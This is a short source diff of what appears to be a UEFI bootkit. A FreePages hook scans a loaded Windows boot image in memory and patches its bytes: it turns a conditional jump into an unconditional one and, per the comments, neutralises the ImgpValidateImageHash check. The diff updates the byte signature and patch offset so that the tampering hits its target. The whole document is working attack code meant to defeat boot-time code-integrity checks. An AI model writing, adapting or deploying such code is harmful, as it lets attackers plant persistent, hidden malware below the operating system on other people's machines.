@@ -76,11 +76,11 @@ D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN U
                 while ( U_PTR( Adr ) < U_PTR( Dos ) + Nth->OptionalHeader.SizeOfImage )
                 {
                     /* jz short loc_180096FBF -> jmp short loc_180096FBF */
-                    if ( Adr[ 0x00 ] == 0xC7 &&
-                         Adr[ 0x01 ] == 0x74 &&
-                         Adr[ 0x04 ] == 0x0F )
+                    if ( Adr[ 0x00 ] == 0xC1 &&
+                         Adr[ 0x03 ] == 0xC7 &&
+                         Adr[ 0x04 ] == 0x74 )
                     {
-                        *( PUINT8 )( U_PTR( Adr + 0x01 ) ) = ( UINT8 )( 0xEB ); /* jmp */
+                        *( PUINT8 )( U_PTR( Adr + 0x04 ) ) = ( UINT8 )( 0xEB ); /* jmp */
                     }
 
                     /* call ImgpValidateImageHash -> xor eax, eax */
@@ -111,3 +111,4 @@ LEAVE:
     /* Execute original routine */
     return ( ( D_API( FreePagesHook ) )( Gen->FreePages ) )( Memory, Pages );
 } E_SEC;
+
